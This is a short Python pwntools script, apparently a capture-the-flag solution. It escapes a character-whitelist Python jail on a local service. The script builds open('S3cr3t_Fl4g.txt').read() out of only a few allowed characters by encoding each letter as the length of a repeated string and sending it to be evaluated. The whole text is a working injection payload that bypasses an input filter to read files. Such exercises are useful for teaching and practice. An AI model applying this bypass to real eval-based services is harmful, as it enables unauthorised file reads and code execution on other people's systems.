from pwn import *

r = remote("127.0.0.1","1337")

whitelist = 'e")n%(,lc'

target = "S3cr3t_Fl4g.txt"

payload = f"'{'%c'*len(target)}'%("
for char in target:
	payload += f"len('{ord(char)*'e'}'),"

final = f"open({payload[:-1]})).read()"
r.sendlineafter(b"> ", final.encode())
print(r.recvline().decode().strip())
